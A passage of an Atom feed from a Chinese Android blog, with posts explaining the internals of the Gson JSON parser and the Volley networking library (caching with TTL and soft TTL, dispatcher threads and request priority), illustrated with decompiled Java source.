class="string">" to Json"</span>, var9);</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            json.setLenient(lenient);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> e;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>注意上面的第三个方法，里面实际上返回的是Stream.parse(json)</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JsonElement parse(JsonReader reader) throws JsonParseException &#123;</span><br><span class="line">        boolean isEmpty = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            reader.peek();</span><br><span class="line">            isEmpty = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">return</span> (JsonElement)TypeAdapters.JSON_ELEMENT.read(reader);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (EOFException var3) &#123;</span><br><span class="line">            <span class="keyword">if</span>(isEmpty) &#123;</span><br><span class="line">                <span class="keyword">return</span> JsonNull.INSTANCE;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonSyntaxException</span>(var3);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (MalformedJsonException var4) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonSyntaxException</span>(var4);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonIOException</span>(var5);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NumberFormatException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="type">JsonSyntaxException</span>(var6);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里又返回了TypeAdapters.JSON_ELEMENT.read(reader)方法，那我们就来看看read方法又返回了什么</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> JsonElement read(JsonReader <span class="keyword">in</span>) throws IOException &#123;</span><br><span class="line">                <span class="keyword">switch</span>(TypeAdapters.SyntheticClass_1.$SwitchMap$com$google$gson$stream$JsonToken[<span class="keyword">in</span>.peek().ordinal()]) &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">1</span>:<span class="type"></span></span><br><span class="line"><span class="type">                    String number </span>= <span class="keyword">in</span>.nextString();</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> <span class="type">JsonPrimitive</span>(<span class="keyword">new</span> <span class="type">LazilyParsedNumber</span>(number));</span><br><span class="line">                <span class="keyword">case</span> <span class="number">2</span>:<span class="type"></span></span><br><span class="line"><span class="type">                    return new JsonPrimitive</span>(Boolean.valueOf(<span class="keyword">in</span>.nextBoolean()));</span><br><span class="line">                <span class="keyword">case</span> <span class="number">3</span>:<span class="type"></span></span><br><span class="line"><span class="type">                    return new JsonPrimitive</span>(<span class="keyword">in</span>.nextString());</span><br><span class="line">                <span class="keyword">case</span> <span class="number">4</span>:<span class="type"></span></span><br><span class="line"><span class="type">                    in</span>.nextNull();</span><br><span class="line">                    <span class="keyword">return</span> JsonNull.INSTANCE;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">5</span>:<span class="type"></span></span><br><span class="line"><span class="type">                    JsonArray array </span>= <span class="keyword">new</span> <span class="type">JsonArray</span>();</span><br><span class="line">                    <span class="keyword">in</span>.beginArray();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(<span class="keyword">in</span>.hasNext()) &#123;</span><br><span class="line">                        array.add(<span class="built_in">this</span>.read(<span class="keyword">in</span>));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">in</span>.endArray();</span><br><span class="line">                    <span class="keyword">return</span> array;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">6</span>:<span class="type"></span></span><br><span class="line"><span class="type">                    JsonObject object </span>= <span class="keyword">new</span> <span class="type">JsonObject</span>();</span><br><span class="line">                    <span class="keyword">in</span>.beginObject();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">while</span>(<span class="keyword">in</span>.hasNext()) &#123;</span><br><span class="line">                        object.add(<span class="keyword">in</span>.nextName(), <span class="built_in">this</span>.read(<span class="keyword">in</span>));</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">in</span>.endObject();</span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">7</span>:<span class="type"></span></span><br><span class="line"><span class="type">                case 8</span>:</span><br><span class="line">                <span class="keyword">case</span> <span class="number">9</span>:<span class="type"></span></span><br><span class="line"><span class="type">                case 10</span>:</span><br><span class="line">                <span class="keyword">default</span>:<span class="type"></span></span><br><span class="line"><span class="type">                    throw new IllegalArgumentException</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>从这上面的case我们不难看出，这里实际上就是根据不同的数据类型进行不同的数据解析。例如case 6,针对的是一个object类型，也就获取它的name和value放入object中，case 5则是针对的Array类型。</p><p>所以实际上就是解析Json，然后返回一个调用者想要的对象</p><h2 id="一句话总结"><a href="#一句话总结" class="headerlink" title="一句话总结"></a>一句话总结</h2><p>两种创建方式，区别在于一个是反射一个不是反射。如果想要避免使用反射，自定义TypeAdapter即可，factories会自动将其添加到list的前面，当使用时就会优先遍历到指定的adapter。<br>JsonParser对Json串进行解析处理，根据对应的数据类型最终返回给用户一个指定的对象。这也就是我们创建一个对象实体类的原因</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;以前写了一篇关于如何使用GSon的文章: &lt;a href=&quot;http://imlzq.com/2015/12/07/gson/&quot;&gt;Json数据的解析_Gson&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;这里就对Gson的内部实现原理进行一个总结&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Volley</title>
    <link href="http://imlzq.com/2016/06/04/Volley/"/>
    <id>http://imlzq.com/2016/06/04/Volley/</id>
    <published>2016-06-03T16:00:00.000Z</published>
    <updated>2018-02-12T10:20:57.958Z</updated>
    
    <content type="html"><![CDATA[<p>自从15年8月使用Volley以来，感触很多，源码也过了几次，第一篇博客<strong>三级缓存 Volley /Lrucache/DiskLrucache + AndroidStudio导出jar包 + upload to github</strong>就是使用Volley结合LruCache和DiskLruCache构建的三级缓存。其实关于Volley底层的实现在以前的博客中或多或少都有提及，例如缓存，队列等等，这篇博客就对它进行全方面的总结</p><a id="more"></a><h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>首先，我们从缓存开始入手，毕竟这个算它的一个特点，也是一个优势。<br>我的第一篇博客实现三级缓存就利用的Volley的网络层缓存，LruCache的内存缓存和DiskLruCache的磁盘缓存。</p><p>Volley是实现了网络层缓存和内存缓存的。</p><h2 id="网络请求的发起流程"><a href="#网络请求的发起流程" class="headerlink" title="网络请求的发起流程"></a>网络请求的发起流程</h2><ol><li>检测是否开启缓存，如果开启，跳入２；不需要，加入网络队列中</li><li>判断是否存在该网络请求的缓存，如果存在且未过期，则直接返回该缓存结果。如果不存在，则将它加入网络队列并进入流程３<strong>【注释一】</strong></li><li>判断现有的网络队列中是否已经存在相同的网络请求，如果存在，则将该请求加入等待队列中，等待上一个相同请求的返回结果，也就是常说的请求合并</li><li>返回结果并处理</li></ol><p><img src="http://upload-images.jianshu.io/upload_images/699911-4f50fb7c44adb5ae.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="volley"></p><p><strong>过期</strong><br>在上面的流程２也就是注释一的位置，Volley对于每一个缓存需要判断它们是否过期，而关于这个过期，则分为Softttl和ttl。</p><p>TTL的意思就是该缓存已经无效，必须重新从网络中获取。最终返回给调用者的是最新的那一次请求结果</p><p>而SoftTTL则会返回两次数据，第一次数据是本次的缓存数据，在返回该数据时也会将该网络请求加入到网络队列中，在请求数据返回后再次返给调用者。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">Entry</span> </span>&#123;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">byte</span>[] data;</span><br><span class="line">       <span class="keyword">public</span> String etag;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">long</span> serverDate;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">long</span> lastModified;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">long</span> ttl;</span><br><span class="line">       <span class="keyword">public</span> <span class="keyword">long</span> softTtl;</span><br><span class="line">       <span class="keyword">public</span> Map&lt;String, String&gt; responseHeaders = Collections.emptyMap();</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="title">Entry</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isExpired</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">this</span>.ttl &lt; System.currentTimeMillis();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">refreshNeeded</span><span class="params">()</span> </span>&#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">this</span>.softTtl &lt; System.currentTimeMillis();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><strong>为什么要这么设计呢？</strong><br>个人思考：我觉得这个是对缓存的一个人性化设计。因为对于一个缓存来讲可能存在两种情况，第一种情况就是该缓存已经过期很久很久，完全不可用，所以就抛弃掉并重新获取。而软缓存就是那些过期不是特别久，也就是说在一定程度上可能还有些作用的缓存。例如现在有一个界面，刷新时可以让用户看到不久之前的信息，刷新结束后再将最新的数据呈现给用户。</p><h2 id="线程管理"><a href="#线程管理" class="headerlink" title="线程管理"></a>线程管理</h2><p>NetWorkDispatcher类负责从网络工作队列中取出一个请求并执行。默认情况下存在４个工作线程为他服务</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> DEFAULT_NETWORK_THREAD_POOL_SIZE = <span class="number">4</span>;</span><br></pre></td></tr></table></figure><p>而上面从定义的名字来说，是NetWork thread pool,但是实际上它并不是使用传统的线程池来管理的，而是使用一个NetWorkDispather数组来进行管理</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> NetworkDispatcher[] mDispatchers;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> void start() &#123;</span><br><span class="line">        <span class="keyword">this</span>.stop();</span><br><span class="line">        <span class="keyword">this</span>.mCacheDispatcher = new CacheDispatcher(<span class="keyword">this</span>.mCacheQueue, <span class="keyword">this</span>.mNetworkQueue, <span class="keyword">this</span>.mCache, <span class="keyword">this</span>.mDelivery);</span><br><span class="line">        <span class="keyword">this</span>.mCacheDispatcher.start();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(int i = <span class="number">0</span>; i &lt; <span class="keyword">this</span>.mDispatchers.length; ++i) &#123;</span><br><span class="line">            NetworkDispatcher networkDispatcher = new NetworkDispatcher(<span class="keyword">this</span>.mNetworkQueue, <span class="keyword">this</span>.mNetwork, <span class="keyword">this</span>.mCache, <span class="keyword">this</span>.mDelivery);</span><br><span class="line">            <span class="keyword">this</span>.mDispatchers[i] = networkDispatcher;</span><br><span class="line">            networkDispatcher.start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>但是在这里就不难发现其实是存在一个问题的，因为如果工作线程发生异常退出，那么就无法生成一个新的工作线程来弥补之前这个空缺，因此这里极有可能会出现问题。当前总结的Volley版本是1.0.11，也就是第一篇博客中使用到的Volley版本，不知道现在是否已经优化</p><h2 id="线程优先级"><a href="#线程优先级" class="headerlink" title="线程优先级"></a>线程优先级</h2><figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">int</span> compareTo(<span class="built_in">Request</span>&lt;T&gt; other) &#123;</span><br><span class="line">        <span class="built_in">Request</span>.Priority <span class="built_in">left</span> = this.getPriority();</span><br><span class="line">        <span class="built_in">Request</span>.Priority <span class="built_in">right</span> = other.getPriority();</span><br><span class="line">        return <span class="built_in">left</span> == <span class="built_in">right</span>?this.mSequence.intValue() - other.mSequence.intValue():<span class="built_in">right</span>.ordinal() - <span class="built_in">left</span>.ordinal();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里的话主要就是根据每个请求的sequence来确定的，而sequence是在add的时候由进行获取，同时自增，也就是说它是由一个计数器进行管理的。也就可以保证每一次取任务取的都是队列头部的任务</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> &lt;T&gt; Request&lt;T&gt; add(Request&lt;T&gt; request) &#123;</span><br><span class="line">        request.setRequestQueue(<span class="keyword">this</span>);</span><br><span class="line">        Set var2 = <span class="keyword">this</span>.mCurrentRequests;</span><br><span class="line">        synchronized(<span class="keyword">this</span>.mCurrentRequests) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mCurrentRequests.add(request);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        request.setSequence(<span class="keyword">this</span>.getSequenceNumber());</span><br><span class="line">        request.addMarker(<span class="string">"add-to-queue"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!request.shouldCache()) &#123;</span><br><span class="line">            <span class="keyword">this</span>.mNetworkQueue.add(request);</span><br><span class="line">            <span class="keyword">return</span> request;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Map var7 = <span class="keyword">this</span>.mWaitingRequests;</span><br><span class="line">            synchronized(<span class="keyword">this</span>.mWaitingRequests) &#123;</span><br><span class="line">                String cacheKey = request.getCacheKey();</span><br><span class="line">                <span class="keyword">if</span>(<span class="keyword">this</span>.mWaitingRequests.containsKey(cacheKey)) &#123;</span><br><span class="line">                    Object stagedRequests = (Queue)<span class="keyword">this</span>.mWaitingRequests.<span class="keyword">get</span>(cacheKey);</span><br><span class="line">                    <span class="keyword">if</span>(stagedRequests == <span class="literal">null</span>) &#123;</span><br><span class="line">                        stagedRequests = new LinkedList();</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    ((Queue)stagedRequests).add(request);</span><br><span class="line">                    <span class="keyword">this</span>.mWaitingRequests.put(cacheKey, stagedRequests);</span><br><span class="line">                    <span class="keyword">if</span>(VolleyLog.DEBUG) &#123;</span><br><span class="line">                        VolleyLog.v(<span class="string">"Request for cacheKey=%s is in flight, putting on hold."</span>, new Object[]&#123;cacheKey&#125;);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">this</span>.mWaitingRequests.put(cacheKey, (Object)<span class="literal">null</span>);</span><br><span class="line">                    <span class="keyword">this</span>.mCacheQueue.add(request);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> request;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> int getSequenceNumber() &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.mSequenceGenerator.incrementAndGet();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里需要注意一下，优先级高只是说明它先发出，并不能够确保它一定先返回</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Volley适合的请求为“短，小，快”，也就是说它并不适合大文件的下载操作，这是因为它存在一个内存缓存，100M的文件直接给你缓存到内存中，这样的体验就不是特别好。而如果单纯的把缓存关闭掉的话，就不如使用Retrofit + OKHttp了<br>上面还有一些超时重发请求，反序列化操作未总结，因为觉得这个不算什么吧，因此就此略过，而他们的使用其实也是可以自己再二次封装一下的，这样就可以让原来已经很简洁的代码变得更简洁</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自从15年8月使用Volley以来，感触很多，源码也过了几次，第一篇博客&lt;strong&gt;三级缓存 Volley /Lrucache/DiskLrucache + AndroidStudio导出jar包 + upload to github&lt;/strong&gt;就是使用Volley结合LruCache和DiskLruCache构建的三级缓存。其实关于Volley底层的实现在以前的博客中或多或少都有提及，例如缓存，队列等等，这篇博客就对它进行全方面的总结&lt;/p&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://imlzq.com/tags/Android/"/>
    
  </entry>
  
</feed>
